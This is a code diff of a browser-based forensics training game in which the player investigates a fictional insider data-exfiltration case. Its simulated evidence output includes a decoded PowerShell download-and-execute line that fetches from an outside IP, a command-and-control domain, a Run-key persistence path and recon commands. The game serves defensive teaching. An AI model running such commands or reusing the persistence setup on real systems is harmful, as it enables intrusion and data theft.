+                    engine.printLine('', 'system');
+                    engine.printLine('Recent documents (RecentDocs):', 'heading');
+                    engine.printLine('  quarterly-financials.xlsx   (2024-01-15 14:09)', 'node-info');
+                    engine.printLine('  employee-database.csv        (2024-01-15 14:11)', 'node-info');
+                    engine.printLine('  project-roadmap.docx         (2024-01-15 14:13)', 'node-info');
+                    break;
+
+                case 'browser-data':
+                    engine.printLine('Parsing Chrome profile data...', 'system');
+                    engine.printLine('', 'system');
+                    engine.printLine('Download history (last 24h):', 'heading');
+                    engine.printLine('  2024-01-15 13:55:08  secure-transfer-tool.exe', 'evidence');
+                    engine.printLine('    Source: https://file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'warning');
+                    engine.printLine('    Size:   1.2 MB', 'node-info');
+                    engine.printLine('    [!] Domain not in corporate allowlist', 'warning');
+                    engine.printLine('    [!] EXE downloaded outside IT-managed channels', 'warning');
+                    engine.printLine('', 'system');
+                    engine.printLine('Browsing history (relevant entries):', 'heading');
+                    engine.printLine('  13:42 \u2014 file-drop.suspicious-domain.xyz (referral: email link)', 'node-info');
+                    engine.printLine('  13:55 \u2014 file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'node-info');
+                    engine.printLine('  14:02 \u2014 [no further browsing \u2014 activity stops]', 'info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Suspicious download identified. Use "strings secure-transfer-tool.exe" to analyze.', 'warning');
+                    break;
+
+                case 'email-store':
+                    engine.printLine('Parsing Outlook PST archive...', 'system');
+                    engine.printLine('', 'system');
+                    engine.printLine('Flagged messages:', 'heading');
+                    engine.printLine('  From:    ext.contact@protonmail.com', 'evidence');
+                    engine.printLine('  To:      jdoe@corp-internal.com', 'evidence');
+                    engine.printLine('  Date:    2024-01-15 13:38:14 UTC', 'node-info');
+                    engine.printLine('  Subject: Confidential: use this tool for the transfer', 'warning');
+                    engine.printLine('  Body:', 'heading');
+                    engine.printLine('    John \u2014 Use the attached link for the secure transfer.', 'info');
+                    engine.printLine('    The tool handles encryption automatically. Delete after use.', 'info');
+                    engine.printLine('    Link: https://file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'warning');
+                    engine.printLine('    \u2014 V', 'info');
+                    engine.printLine('', 'system');
+                    engine.printLine('  [!] External sender. Matches download URL in Chrome history.', 'warning');
+                    engine.printLine('  [!] "V" \u2014 sender identity unknown, possible insider handler', 'warning');
+                    engine.printLine('', 'system');
+                    engine.printLine('Additional findings:', 'heading');
+                    engine.printLine('  No prior communication with ext.contact@protonmail.com found', 'info');
+                    engine.printLine('  Message not forwarded. Reply: none.', 'info');
+                    break;
+
+                case 'event-logs':
+                    engine.printLine('Parsing Windows Event Log exports (evtx)...', 'system');
+                    engine.printLine('', 'system');
+                    engine.printLine('Security log (Security.evtx):', 'heading');
+                    engine.printLine('  4624  Logon          jdoe (Type 2 Interactive)       08:51:03', 'node-info');
+                    engine.printLine('  4688  Process Create  cmd.exe \u2192 powershell.exe -enc ...    14:02:19', 'warning');
+                    engine.printLine('         Encoded arg decoded: IEX (iwr http://185.220.101.47/drop)', 'warning');
+                    engine.printLine('  4688  Process Create  powershell.exe \u2192 update-service.exe   14:02:31', 'warning');
+                    engine.printLine('  4663  Object Access   D:\\Confidential\\*.xlsx (jdoe, READ)    14:09-14:14', 'evidence');
+                    engine.printLine('  4663  Object Access   D:\\Confidential\\*.csv  (jdoe, READ)    14:10-14:12', 'evidence');
+                    engine.printLine('  4663  Object Access   D:\\Confidential\\*.docx (jdoe, READ)    14:13', 'evidence');
+                    engine.printLine('', 'system');
+                    engine.printLine('Security log (end):', 'heading');
+                    engine.printLine('  1102  Audit Log Cleared  jdoe clears Security log    14:25:07', 'warning');
+                    engine.printLine('  [!] Log cleared after data access \u2014 ANTI-FORENSIC INDICATOR', 'warning');
+                    engine.printLine('', 'system');
+                    engine.printLine('System log (System.evtx):', 'heading');
+                    engine.printLine('  7045  New Service Installed  UpdateService             14:02:30', 'warning');
+                    engine.printLine('        Path: C:\\Users\\jdoe\\AppData\\Roaming\\update-service.exe', 'node-info');
+                    break;
+
+                case 'recycle-bin':
+                    engine.printLine('Mounting $Recycle.Bin from disk image...', 'system');
+                    engine.printLine('', 'system');
+                    engine.printLine('Recoverable files found:', 'heading');
+                    engine.printLine('  $RKJSA81.xlsx   quarterly-financials.xlsx   245 KB   2024-01-15 14:23:01', 'evidence');
+                    engine.printLine('  $RKJSA82.csv    employee-database.csv         1.2 MB   2024-01-15 14:23:12', 'evidence');
+                    engine.printLine('  $RKJSA83.docx   project-roadmap.docx          890 KB   2024-01-15 14:23:19', 'evidence');
+                    engine.printLine('  $RKJSA84.exe    secure-transfer-tool.exe      1.2 MB   2024-01-15 14:24:55', 'warning');
+                    engine.printLine('', 'system');
+                    engine.printLine('[!] Subject deleted these files immediately after data access.', 'warning');
+                    engine.printLine('[!] Deletion timestamps corroborate event log timeline.', 'warning');
+                    engine.printLine('', 'system');
+                    engine.printLine('Use "recover all" to restore files to evidence locker.', 'system');
+                    break;
+
+                default:
+                    engine.printLine('Nothing significant found here.', 'system');
             }
 
-            agentEl.style.display = isCurrent ? 'block' : 'none';
+            engine.printLine('', 'system');
+            engine.updateGrid();
+            engine.checkObjectives();
+            engine.saveState();
         }
-    }
-}
 
-// ═══ Fog of War ═══
+        function cmdStrings(args) {
+            var state = engine.getState();
+            var cellType = getCell();
+            var artifact = args.join(' ').toLowerCase();
 
-function revealAdjacent(col, row) {
-    var dirs = [[0,-1],[0,1],[1,0],[-1,0]];
-    dirs.forEach(function(d) {
-        var nc = col + d[0];
-        var nr = row + d[1];
-        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) return;
-        if (GRID_MAP[nr][nc] === 'wall') return;
-        var key = nc + ',' + nr;
-        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
-            STATE.visibility[key] = 'revealed';
-            var cell = document.querySelector('.grid-cell[data-col="' + nc + '"][data-row="' + nr + '"]');
-            if (cell) {
-                cell.classList.add('just-revealed');
-                setTimeout(function() { cell.classList.remove('just-revealed'); }, 500);
+            if (!artifact) { engine.printLine('Usage: strings <artifact>', 'error'); engine.printLine('Example: strings secure-transfer-tool.exe', 'system'); return; }
+
+            engine.printLine('', 'system');
+
+            // Critical path: strings on the dropper at browser-data node
+            if (cellType === 'browser-data') {
+                var isDropper = artifact.indexOf('secure') !== -1 ||
+                                artifact.indexOf('transfer') !== -1 ||
+                                artifact.indexOf('download') !== -1 ||
+                                artifact.indexOf('dropper') !== -1 ||
+                                artifact.indexOf('exe') !== -1 ||
+                                artifact.indexOf('tool') !== -1;
+
+                if (isDropper) {
+                    if (!state.nodesExamined || !state.nodesExamined.has('browser-data')) {
+                        engine.printLine('[!] Examine this node first to identify the download.', 'warning');
+                        return;
+                    }
+                    engine.printLine('Running strings analysis on secure-transfer-tool.exe...', 'system');
+                    engine.printLine('', 'system');
+                    engine.printLine('\u2550\u2550\u2550 EMBEDDED STRINGS (filtered) \u2550\u2550\u2550', 'heading');
+                    engine.printLine('  C2 beacon:    beacon.malware-c2.xyz', 'evidence');
+                    engine.printLine('  Exfil path:   /upload', 'evidence');
+                    engine.printLine('  User-Agent:   UpdateService/1.0', 'evidence');
+                    engine.printLine('  Encryption:   AES-256 (key embedded in binary)', 'evidence');
+                    engine.printLine('  Mutex:        Global\\UpdateServiceMutex_v2', 'node-info');
+                    engine.printLine('  Install path: C:\\Users\\%USERNAME%\\AppData\\Roaming\\update-service.exe', 'node-info');
+                    engine.printLine('  Reg key:      HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'node-info');
+                    engine.printLine('  Staging dir:  C:\\ProgramData\\upd_cache\\', 'node-info');
+                    engine.printLine('', 'system');
+                    engine.printLine('[!] C2 domain confirmed: beacon.malware-c2.xyz', 'warning');
+                    engine.printLine('[!] This binary is the malware dropper. Persistence via Run key.', 'warning');
+                    engine.printLine('', 'system');
+                    engine.printLine('Malware dropper identified and characterized.', 'success');
+                    state.dropperFound = true;
+                    engine.checkObjectives();
+                    engine.updateGrid();
+                    engine.saveState();
+                    return;
+                }
             }
+
+            // Generic strings output for other nodes
+            engine.printLine('Running strings analysis on "' + args.join(' ') + '"...', 'system');
+            engine.printLine('', 'system');
+
+            if (cellType === 'disk-image') {
+                engine.printLine('  [strings output from disk image sectors]', 'info');
+                engine.printLine('  MFT entry fragments, NTFS metadata, volume label: WORKST-JDOE', 'node-info');
+                engine.printLine('  File path strings: C:\\Users\\jdoe\\Desktop, C:\\Users\\jdoe\\Downloads', 'node-info');
+                engine.printLine('  No high-value strings found in this artifact.', 'system');
+            } else if (cellType === 'memory-dump') {
+                engine.printLine('  [strings from memory pages]', 'info');
+                engine.printLine('  Fragments: cmd.exe /c whoami, net user, ipconfig /all', 'node-info');
+                engine.printLine('  Possible recon commands found in memory.', 'warning');
+                engine.printLine('  Hint: Use "examine" at BROWSER to find the dropper download.', 'system');
+            } else if (cellType === 'registry') {
+                engine.printLine('  [strings from registry hive binary]', 'info');
+                engine.printLine('  Key paths, value names, software installation GUIDs', 'node-info');
+                engine.printLine('  No additional high-value strings beyond what examine showed.', 'system');
+            } else {
+                engine.printLine('  No notable strings found in that artifact at this location.', 'system');
+                engine.printLine('  Try: strings secure-transfer-tool.exe at the BROWSER node.', 'info');
+            }
+            engine.printLine('', 'system');
         }
-    });
-}
 
-// ═══ Terminal Output ═══
-
-function printLine(text, type) {
-    var output = document.getElementById('term-output');
-    var line = document.createElement('div');
-    line.className = 'term-line term-' + (type || 'system');
-    line.textContent = text;
-    output.appendChild(line);
-
-    // Cap at 300 lines to prevent memory bloat
-    while (output.children.length > 300) {
-        output.removeChild(output.firstChild);
-    }
-    output.scrollTop = output.scrollHeight;
-}
-
-// ═══ Command Handlers ═══
-
-function cmdHelp() {
-    printLine('', 'system');
-    printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
-    printLine('  scan                     Survey area, reveal adjacent sources', 'info');
-    printLine('  move <dir>               Move examiner (north/south/east/west or n/s/e/w)', 'info');
-    printLine('  examine                  Examine current node for evidence', 'info');
-    printLine('  strings <artifact>       Run strings analysis on an artifact', 'info');
-    printLine('  timeline                 Build forensic timeline (requires 3+ sources examined)', 'info');
-    printLine('  recover <file>           Recover deleted files (at RECYCLE-BIN only)', 'info');
-    printLine('  hash <file>              Compute SHA-256 hash of an artifact', 'info');
-    printLine('  report                   Generate summary of findings so far', 'info');
-    printLine('  status                   Show position and objectives', 'info');
-    printLine('  help                     Show this reference', 'info');
-    printLine('  clear                    Clear terminal output', 'info');
-    printLine('', 'system');
-    printLine('Hint: "examine" every node you visit. Use "strings" on downloads.', 'system');
-}
-
-function cmdScan() {
-    var col = STATE.position.col;
-    var row = STATE.position.row;
-    var cellType = GRID_MAP[row][col];
-
-    printLine('Scanning area...', 'system');
-    printLine('', 'system');
-
-    // Current position info
-    if (cellType !== 'empty' && cellType !== 'wall') {
-        var cur = CELL_INFO[cellType];
-        printLine('Current: ' + cur.label + ' \u2014 ' + cur.desc, 'heading');
-        printLine('OS/Type: ' + cur.os, 'info');
-    } else {
-        printLine('Current: Clear area (no evidence source here)', 'heading');
-    }
-
-    printLine('', 'system');
-    printLine('Adjacent:', 'heading');
-
-    var dirs = [
-        { name: 'North', dc: 0, dr: -1 },
-        { name: 'South', dc: 0, dr: 1 },
-        { name: 'East',  dc: 1, dr: 0 },
-        { name: 'West',  dc: -1, dr: 0 }
-    ];
-
-    dirs.forEach(function(d) {
-        var nc = col + d.dc;
-        var nr = row + d.dr;
-        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) {
-            printLine('  ' + d.name + ': [boundary]', 'system');
-            return;
-        }
-        var type = GRID_MAP[nr][nc];
-        if (type === 'wall') {
-            printLine('  ' + d.name + ': [inaccessible]', 'system');
-            return;
-        }
-        // Reveal on scan
-        var key = nc + ',' + nr;
-        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
-            STATE.visibility[key] = 'revealed';
-        }
-        if (type === 'empty') {
-            printLine('  ' + d.name + ': Clear path', 'info');
-        } else {
-            var info = CELL_INFO[type];
-            printLine('  ' + d.name + ': ' + info.label + ' \u2014 ' + info.desc, 'node-info');
-        }
-    });
-
-    updateGrid();
-    saveState();
-}
-
-function cmdMove(args) {
-    if (!args.length) {
-        printLine('Usage: move <direction>', 'error');
-        printLine('Directions: north/south/east/west (or n/s/e/w)', 'system');
-        return;
-    }
-
-    var dirMap = {
-        'north': [0,-1], 'n': [0,-1],
-        'south': [0,1],  's': [0,1],
-        'east':  [1,0],  'e': [1,0],
-        'west':  [-1,0], 'w': [-1,0]
-    };
-
-    var dir = args[0].toLowerCase();
-    if (!dirMap[dir]) {
-        printLine('Unknown direction: ' + args[0], 'error');
-        printLine('Use: north/south/east/west (or n/s/e/w)', 'system');
-        return;
-    }
-
-    var d = dirMap[dir];
-    var newCol = STATE.position.col + d[0];
-    var newRow = STATE.position.row + d[1];
-
-    // Bounds check
-    if (newCol < 0 || newCol >= COLS || newRow < 0 || newRow >= ROWS) {
-        printLine('Cannot move ' + dir + '. Edge of workspace.', 'error');
-        return;
-    }
-
-    var cellType = GRID_MAP[newRow][newCol];
-
-    // Wall check
-    if (cellType === 'wall') {
-        printLine('Blocked. No path ' + dir + '.', 'error');
-        return;
-    }
-
-    // Execute move
-    STATE.position = { col: newCol, row: newRow };
-    STATE.visibility[newCol + ',' + newRow] = 'visited';
-
-    if (cellType !== 'empty') {
-        STATE.nodesDiscovered.add(cellType);
-    }
-
-    revealAdjacent(newCol, newRow);
-
-    // Direction display name
-    var dirFull = { n: 'north', s: 'south', e: 'east', w: 'west' };
-    var dirName = dirFull[dir] || dir;
-
-    if (cellType === 'empty') {
-        printLine('Moving ' + dirName + '... Clear area.', 'system');
-    } else {
-        var info = CELL_INFO[cellType];
-        printLine('Moving ' + dirName + '... Reached ' + info.label, 'success');
-        printLine(info.desc + ' [' + info.os + ']', 'info');
-        printLine('Use "examine" to analyze this source.', 'system');
-    }
-
-    checkObjectives();
-    updateGrid();
-    saveState();
-}
-
-function cmdExamine() {
-    var col = STATE.position.col;
-    var row = STATE.position.row;
-    var cellType = GRID_MAP[row][col];
-
-    if (cellType === 'empty' || cellType === 'wall') {
-        printLine('Nothing to examine here. Move to an evidence source.', 'warning');
-        return;
-    }
-
-    // Mark this node as examined
-    STATE.nodesExamined.add(cellType);
-
-    printLine('', 'system');
-    printLine('\u2550\u2550\u2550 EXAMINING: ' + CELL_INFO[cellType].label + ' \u2550\u2550\u2550', 'heading');
-    printLine('', 'system');
-
-    switch (cellType) {
-
-        case 'evidence-ws':
-            printLine('Case #2024-0847 \u2014 OPEN', 'evidence');
-            printLine('Subject: John Doe (jdoe), Senior Financial Analyst', 'info');
-            printLine('Allegation: Suspected data exfiltration from corporate laptop', 'info');
-            printLine('Device: Dell Latitude 7420, SN: DL7420-2847', 'info');
-            printLine('', 'system');
-            printLine('Collected artifacts:', 'heading');
-            printLine('  [1] suspect-hdd.dd     \u2014 raw disk image, 500GB', 'node-info');
-            printLine('  [2] mem_20240115.dmp    \u2014 volatile memory, 8GB', 'node-info');
-            printLine('  [3] registry_hives.zip  \u2014 SYSTEM, SOFTWARE, NTUSER.DAT', 'node-info');
-            printLine('  [4] chrome_profile.zip  \u2014 browser history, cache, downloads', 'node-info');
-            printLine('  [5] outlook.pst         \u2014 mail archive, 2.4GB', 'node-info');
-            printLine('  [6] evtx_export.zip     \u2014 Security/System/Application logs', 'node-info');
-            printLine('', 'system');
-            printLine('Begin analysis. Image the disk first.', 'system');
-            break;
-
-        case 'disk-image':
-            printLine('Mounting suspect-hdd.dd for analysis...', 'system');
-            printLine('', 'system');
-            printLine('Computing integrity hash...', 'system');
-            printLine('SHA-256: a3f2c8d91e4b76a05f2381cd9047e3f6a8b1c4d7e9025abc13...', 'evidence');
-            printLine('        (integrity confirmed \u2014 hash matches intake record)', 'success');
-            printLine('', 'system');
-            printLine('Partition table:', 'heading');
-            printLine('  /dev/sda1   NTFS primary   465.8 GB  [Windows C: drive]', 'node-info');
-            printLine('  /dev/sda2   NTFS recovery  499.0 MB  [WinRE Recovery]', 'node-info');
-            printLine('', 'system');
-            printLine('File system stats:', 'heading');
-            printLine('  Total files:   148,392', 'info');
-            printLine('  Deleted files: 847 (recoverable)', 'info');
-            printLine('  Last write:    2024-01-15 14:27:03 UTC', 'info');
-            printLine('', 'system');
-            printLine('Disk image verified and mounted.', 'success');
-            STATE.diskImaged = true;
-            break;
-
-        case 'memory-dump':
-            printLine('Analyzing mem_20240115.dmp with Volatility 3...', 'system');
-            printLine('Profile: Windows 11 x64 (Build 22621)', 'info');
-            printLine('', 'system');
-            printLine('Running process list (pslist):', 'heading');
-            printLine('  PID   PPID  Name                    Start Time', 'node-info');
-            printLine('  4     0     System', 'node-info');
-            printLine('  688   4     smss.exe', 'node-info');
-            printLine('  892   884   winlogon.exe', 'node-info');
-            printLine('  1024  892   explorer.exe            14:01:12', 'node-info');
-            printLine('  2140  1024  chrome.exe              13:50:44', 'node-info');
-            printLine('  2248  1024  outlook.exe             09:12:03', 'node-info');
-            printLine('  2891  1024  cmd.exe                 14:02:18', 'node-info');
-            printLine('  3012  2891  powershell.exe          14:02:19', 'warning');
-            printLine('         [!] Encoded command detected (-enc flag)', 'warning');
-            printLine('  3201  3012  update-service.exe      14:02:31', 'warning');
-            printLine('         [!] NOT in OS baseline \u2014 UNKNOWN BINARY', 'warning');
-            printLine('  720   4     svchost.exe x8          (system)', 'node-info');
-            printLine('', 'system');
-            printLine('Network connections (netscan):', 'heading');
-            printLine('  update-service.exe -> 185.220.101.47:443 (ESTABLISHED)', 'warning');
-            printLine('  [!] Outbound C2 beacon suspected', 'warning');
-            break;
-
-        case 'registry':
-            printLine('Parsing registry hive exports...', 'system');
-            printLine('', 'system');
-            printLine('USB device history (USBSTOR):', 'heading');
-            printLine('  SANDISK_CRUZER_128GB', 'evidence');
-            printLine('    Serial:     4C530012891231000001', 'node-info');
-            printLine('    First seen: 2024-01-15 14:05:22 UTC', 'node-info');
-            printLine('    Last seen:  2024-01-15 14:21:14 UTC', 'node-info');
-            printLine('    Drive letter assigned: D:', 'node-info');
-            printLine('', 'system');
-            printLine('Run keys (persistence / autostart):', 'heading');
-            printLine('  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'node-info');
-            printLine('    UpdateService = C:\\Users\\jdoe\\AppData\\Roaming\\update-service.exe', 'warning');
-            printLine('    [!] SUSPICIOUS \u2014 not a legitimate Windows service', 'warning');
-            printLine('', 'system');
-            printLine('Recent documents (RecentDocs):', 'heading');
-            printLine('  quarterly-financials.xlsx   (2024-01-15 14:09)', 'node-info');
-            printLine('  employee-database.csv        (2024-01-15 14:11)', 'node-info');
-            printLine('  project-roadmap.docx         (2024-01-15 14:13)', 'node-info');
-            break;
-
-        case 'browser-data':
-            printLine('Parsing Chrome profile data...', 'system');
-            printLine('', 'system');
-            printLine('Download history (last 24h):', 'heading');
-            printLine('  2024-01-15 13:55:08  secure-transfer-tool.exe', 'evidence');
-            printLine('    Source: https://file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'warning');
-            printLine('    Size:   1.2 MB', 'node-info');
-            printLine('    [!] Domain not in corporate allowlist', 'warning');
-            printLine('    [!] EXE downloaded outside IT-managed channels', 'warning');
-            printLine('', 'system');
-            printLine('Browsing history (relevant entries):', 'heading');
-            printLine('  13:42 \u2014 file-drop.suspicious-domain.xyz (referral: email link)', 'node-info');
-            printLine('  13:55 \u2014 file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'node-info');
-            printLine('  14:02 \u2014 [no further browsing \u2014 activity stops]', 'info');
-            printLine('', 'system');
-            printLine('Suspicious download identified. Use "strings secure-transfer-tool.exe" to analyze.', 'warning');
-            break;
-
-        case 'email-store':
-            printLine('Parsing Outlook PST archive...', 'system');
-            printLine('', 'system');
-            printLine('Flagged messages:', 'heading');
-            printLine('  From:    ext.contact@protonmail.com', 'evidence');
-            printLine('  To:      jdoe@corp-internal.com', 'evidence');
-            printLine('  Date:    2024-01-15 13:38:14 UTC', 'node-info');
-            printLine('  Subject: Confidential: use this tool for the transfer', 'warning');
-            printLine('  Body:', 'heading');
-            printLine('    John \u2014 Use the attached link for the secure transfer.', 'info');
-            printLine('    The tool handles encryption automatically. Delete after use.', 'info');
-            printLine('    Link: https://file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'warning');
-            printLine('    \u2014 V', 'info');
-            printLine('', 'system');
-            printLine('  [!] External sender. Matches download URL in Chrome history.', 'warning');
-            printLine('  [!] "V" \u2014 sender identity unknown, possible insider handler', 'warning');
-            printLine('', 'system');
-            printLine('Additional findings:', 'heading');
-            printLine('  No prior communication with ext.contact@protonmail.com found', 'info');
-            printLine('  Message not forwarded. Reply: none.', 'info');
-            break;
-
-        case 'event-logs':
-            printLine('Parsing Windows Event Log exports (evtx)...', 'system');
-            printLine('', 'system');
-            printLine('Security log (Security.evtx):', 'heading');
-            printLine('  4624  Logon          jdoe (Type 2 Interactive)       08:51:03', 'node-info');
-            printLine('  4688  Process Create  cmd.exe \u2192 powershell.exe -enc ...    14:02:19', 'warning');
-            printLine('         Encoded arg decoded: IEX (iwr http://185.220.101.47/drop)', 'warning');
-            printLine('  4688  Process Create  powershell.exe \u2192 update-service.exe   14:02:31', 'warning');
-            printLine('  4663  Object Access   D:\\Confidential\\*.xlsx (jdoe, READ)    14:09-14:14', 'evidence');
-            printLine('  4663  Object Access   D:\\Confidential\\*.csv  (jdoe, READ)    14:10-14:12', 'evidence');
-            printLine('  4663  Object Access   D:\\Confidential\\*.docx (jdoe, READ)    14:13', 'evidence');
-            printLine('', 'system');
-            printLine('Security log (end):', 'heading');
-            printLine('  1102  Audit Log Cleared  jdoe clears Security log    14:25:07', 'warning');
-            printLine('  [!] Log cleared after data access \u2014 ANTI-FORENSIC INDICATOR', 'warning');
-            printLine('', 'system');
-            printLine('System log (System.evtx):', 'heading');
-            printLine('  7045  New Service Installed  UpdateService             14:02:30', 'warning');
-            printLine('        Path: C:\\Users\\jdoe\\AppData\\Roaming\\update-service.exe', 'node-info');
-            break;
-
-        case 'recycle-bin':
-            printLine('Mounting $Recycle.Bin from disk image...', 'system');
-            printLine('', 'system');
-            printLine('Recoverable files found:', 'heading');
-            printLine('  $RKJSA81.xlsx   quarterly-financials.xlsx   245 KB   2024-01-15 14:23:01', 'evidence');
-            printLine('  $RKJSA82.csv    employee-database.csv         1.2 MB   2024-01-15 14:23:12', 'evidence');
-            printLine('  $RKJSA83.docx   project-roadmap.docx          890 KB   2024-01-15 14:23:19', 'evidence');
-            printLine('  $RKJSA84.exe    secure-transfer-tool.exe      1.2 MB   2024-01-15 14:24:55', 'warning');
-            printLine('', 'system');
-            printLine('[!] Subject deleted these files immediately after data access.', 'warning');
-            printLine('[!] Deletion timestamps corroborate event log timeline.', 'warning');
-            printLine('', 'system');
-            printLine('Use "recover all" to restore files to evidence locker.', 'system');
-            break;
-
-        default:
-            printLine('Nothing significant found here.', 'system');
-    }
-
-    printLine('', 'system');
-    updateGrid();
-    checkObjectives();
-    saveState();
-}
-
-function cmdStrings(args) {
-    var col = STATE.position.col;
-    var row = STATE.position.row;
-    var cellType = GRID_MAP[row][col];
-    var artifact = args.join(' ').toLowerCase();
-
-    if (!artifact) {
-        printLine('Usage: strings <artifact>', 'error');
-        printLine('Example: strings secure-transfer-tool.exe', 'system');
-        return;
-    }
-
-    printLine('', 'system');
-
-    // The critical path: strings on the dropper at browser-data node
-    if (cellType === 'browser-data') {
-        var isDropper = artifact.indexOf('secure') !== -1 ||
-                        artifact.indexOf('transfer') !== -1 ||
-                        artifact.indexOf('download') !== -1 ||
-                        artifact.indexOf('dropper') !== -1 ||
-                        artifact.indexOf('exe') !== -1 ||
-                        artifact.indexOf('tool') !== -1;
-
-        if (isDropper) {
-            if (!STATE.nodesExamined.has('browser-data')) {
-                printLine('[!] Examine this node first to identify the download.', 'warning');
+        function cmdTimeline() {
+            var state = engine.getState();
+            if (!state.nodesExamined || state.nodesExamined.size < 3) {
+                var examined = state.nodesExamined ? state.nodesExamined.size : 0;
+                engine.printLine('Insufficient evidence. Examine at least 3 sources before building timeline.', 'warning');
+                engine.printLine('Sources examined: ' + examined + ' / 3 required', 'info');
                 return;
             }
-            printLine('Running strings analysis on secure-transfer-tool.exe...', 'system');
-            printLine('', 'system');
-            printLine('\u2550\u2550\u2550 EMBEDDED STRINGS (filtered) \u2550\u2550\u2550', 'heading');
-            printLine('  C2 beacon:    beacon.malware-c2.xyz', 'evidence');
-            printLine('  Exfil path:   /upload', 'evidence');
-            printLine('  User-Agent:   UpdateService/1.0', 'evidence');
-            printLine('  Encryption:   AES-256 (key embedded in binary)', 'evidence');
-            printLine('  Mutex:        Global\\UpdateServiceMutex_v2', 'node-info');
-            printLine('  Install path: C:\\Users\\%USERNAME%\\AppData\\Roaming\\update-service.exe', 'node-info');
-            printLine('  Reg key:      HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'node-info');
-            printLine('  Staging dir:  C:\\ProgramData\\upd_cache\\', 'node-info');
-            printLine('', 'system');
-            printLine('[!] C2 domain confirmed: beacon.malware-c2.xyz', 'warning');
-            printLine('[!] This binary is the malware dropper. Persistence via Run key.', 'warning');
-            printLine('', 'system');
-            printLine('Malware dropper identified and characterized.', 'success');
 
-            STATE.dropperFound = true;
-            checkObjectives();
-            updateGrid();
-            saveState();
-            return;
+            engine.printLine('', 'system');
+            engine.printLine('\u2550\u2550\u2550 FORENSIC TIMELINE \u2550\u2550\u2550', 'heading');
+            engine.printLine('Case #2024-0847 \u2014 Reconstructed attack sequence', 'info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 13:38  Phishing email received (ext.contact@protonmail.com)', 'evidence');
+            engine.printLine('                  Subject: "Confidential: use this tool for the transfer"', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 13:55  Malware downloaded via Chrome', 'evidence');
+            engine.printLine('                  File: secure-transfer-tool.exe from file-drop.suspicious-domain.xyz', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 14:02  Malware executed via PowerShell dropper', 'evidence');
+            engine.printLine('                  Event 4688: powershell.exe -enc [obfuscated IEX]', 'node-info');
+            engine.printLine('                  Event 4688: update-service.exe spawned', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 14:02  Persistence established', 'evidence');
+            engine.printLine('                  Registry Run key: UpdateService -> update-service.exe', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 14:05  USB device inserted', 'evidence');
+            engine.printLine('                  SANDISK_CRUZER_128GB (Serial: 4C530012891231000001)', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 14:09  Confidential files accessed (D:\\Confidential\\)', 'evidence');
+            engine.printLine('                  Events 4663: *.xlsx, *.csv, *.docx read by jdoe', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 14:18  Files copied to USB (Disk I/O analysis)', 'evidence');
+            engine.printLine('                  Estimated transfer: ~2.3 MB total', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 14:23  Exfiltrated files deleted from local disk', 'evidence');
+            engine.printLine('                  $Recycle.Bin entries created (3 documents + dropper)', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('2024-01-15 14:25  Windows Security Event Log cleared', 'evidence');
+            engine.printLine('                  Event 1102: jdoe cleared audit log (anti-forensics)', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('CONCLUSION: Targeted data exfiltration via spear-phishing + custom malware.', 'success');
+            engine.printLine('            Suspect copied confidential files to external USB device.', 'success');
+            engine.printLine('', 'system');
+
+            state.timelineBuilt = true;
+            engine.checkObjectives();
+            engine.updateGrid();
+            engine.saveState();
         }
-    }
 
-    // Generic strings output for other nodes / artifacts — educational but not objective-critical
-    printLine('Running strings analysis on "' + args.join(' ') + '"...', 'system');
-    printLine('', 'system');
+        function cmdRecover(args) {
+            var state = engine.getState();
+            var cellType = getCell();
+            if (cellType !== 'recycle-bin') { engine.printLine('[!] recover command only works at the RECYCLE-BIN.', 'error'); engine.printLine('Navigate to RECYCLE-BIN first.', 'system'); return; }
+            if (!args.length) { engine.printLine('Usage: recover <file | all>', 'error'); engine.printLine('Example: recover all', 'system'); return; }
 
-    if (cellType === 'disk-image') {
-        printLine('  [strings output from disk image sectors]', 'info');
-        printLine('  MFT entry fragments, NTFS metadata, volume label: WORKST-JDOE', 'node-info');
-        printLine('  File path strings: C:\\Users\\jdoe\\Desktop, C:\\Users\\jdoe\\Downloads', 'node-info');
-        printLine('  No high-value strings found in this artifact.', 'system');
-    } else if (cellType === 'memory-dump') {
-        printLine('  [strings from memory pages]', 'info');
-        printLine('  Fragments: cmd.exe /c whoami, net user, ipconfig /all', 'node-info');
-        printLine('  Possible recon commands found in memory.', 'warning');
-        printLine('  Hint: Use "examine" at BROWSER to find the dropper download.', 'system');
-    } else if (cellType === 'registry') {
-        printLine('  [strings from registry hive binary]', 'info');
-        printLine('  Key paths, value names, software installation GUIDs', 'node-info');
-        printLine('  No additional high-value strings beyond what examine showed.', 'system');
-    } else {
-        printLine('  No notable strings found in that artifact at this location.', 'system');
-        printLine('  Try: strings secure-transfer-tool.exe at the BROWSER node.', 'info');
-    }
-    printLine('', 'system');
-}
+            var target = args.join(' ').toLowerCase();
+            var validTargets = ['all', 'file', 'files', 'evidence', 'deleted', 'everything'];
+            var isValid = validTargets.some(function(v) { return target.indexOf(v) !== -1; });
